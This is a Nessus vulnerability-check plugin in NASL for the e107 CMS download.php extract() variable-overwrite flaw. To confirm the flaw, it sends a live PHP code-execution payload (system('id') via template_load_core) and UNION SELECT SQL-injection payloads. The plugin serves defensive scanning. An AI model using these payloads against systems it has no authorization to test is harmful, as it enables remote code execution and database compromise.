#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33856);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_bugtraq_id(30601);
  script_osvdb_id(47482);
  script_xref(name:"EDB-ID", value:"6219");

  script_name(english:"e107 download.php extract() Function Variable Overwrite");
  script_summary(english:"Tries to execute a command / attempts a SQL injection");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP application that is affected by
variable overwriting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of e107 installed on the remote host contains an
unsafe call to 'extract()' in the 'download.php' script.  An
unauthenticated, remote attacker can leverage this issue to overwrite
arbitrary PHP variables, leading to arbitrary PHP code execution, SQL
injection, as well as other sorts of attacks."
  );
  # http://www.gulftech.org/advisories/e107%20Arbitrary%20Variable%20Overwrite/115
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0f612ec9");
  script_set_attribute(attribute:"see_also", value:"http://e107.org/e107_plugins/bugtrack/changelog.php?0712");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 0.7.12 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/08/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/08/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/08/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);
dir = install['dir'];
install_url = build_url(port:port, qs:dir);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

url = dir + '/download.php';

# Pull up the affected script.
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# If it looks correct...
if (
  ("/e107_files/" >< res[2]) &&
  (": Downloads</title>" >< res[2])
)
{
  # Find a valid download category.
  cat = NULL;

  pat = "<a href='download\.php\?list\.([0-9]+)'";
  matches = egrep(pattern:pat, string:res[2]);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        cat = item[1];
        break;
      }
    }
  }

  # If we found one...
  if (cat)
  {
    url2 = url + "?list." + cat;
    foreach cmd (cmds)
    {
      # Try to exploit the issue to run a command.
      postdata = "view=1&action=maincats&" +
      "template_load_core=system('" + urlencode(str:cmd) + "');";

      res = http_send_recv3(
        method : "POST",
        item   : url2,
        port   : port,
        data   : postdata,
        content_type : "application/x-www-form-urlencoded",
        exit_on_fail : TRUE
      );

      if (egrep(pattern:cmd_pats[cmd], string:res[2]))
      {
        if (report_verbosity)
        {
          snip = crap(data:"-", length:30)+' snip '+crap(data:"-", length:30);
          report =
            '\n' +
            "Nessus was able to execute the command '" +cmd+ "' on the remote"+
            '\nhost using the following request :' +
            '\n' +
            '\n' +  http_last_sent_request() +
            '\n';
          if (report_verbosity > 1)
          {
            output = strstr(res[2], "main_section'>") - "main_section'>";
            pos = stridx(output, "<div class='tablerender'");
            output = substr(output, 0, pos - 1);
            if (!output) output = res[2];

            report +=
              '\n'+
              'This produced the following output :' +
              '\n' +
              '\n' + snip +
              '\n' + chomp(output) +
              '\n' + snip +
              '\n';
          }
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
      }
    }
  }

  # Try the SQL injection.
  magic = rand();
  exploits = make_list(
    "-99') UNION SELECT " +magic+ ",2,3,4-- ",
    "-99' UNION SELECT "  +magic+ ",2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9-- ");
  url2 = url + "?list";

  foreach exploit (exploits)
  {
    postdata = "view=1&id=" + urlencode(str:exploit);

    res = http_send_recv3(
      method : "POST",
      item   : url2,
      port   : port,
      data   : postdata,
      content_type : "application/x-www-form-urlencoded",
      exit_on_fail : TRUE
    );

    # There's a problem if we could manipulate the title.
    if (
      (')' >< exploit) && ((" / " + magic + "</title>") >< res[2]) ||
      (("download.php?view." + magic + "'>") >< res[2])
    )
    {
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      if (report_verbosity)
      {
        snip = crap(data:"-", length:30)+' snip '+crap(data:"-", length:30);
        report =
          '\n' +
          "Nessus was able to verify this issue with the following request :"+
          '\n' +
          '\n' + http_last_sent_request() +
          '\n';
        if (report_verbosity > 1)
        {
          output = egrep(pattern:magic, string:res[2]);
          if (!output) output = res[2];

          report +=
            '\n'+
            'This produced the following truncated output :' +
            '\n' +
            '\n' + snip +
            '\n' + chomp(output) +
            '\n' + snip +
            '\n';
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", install_url);
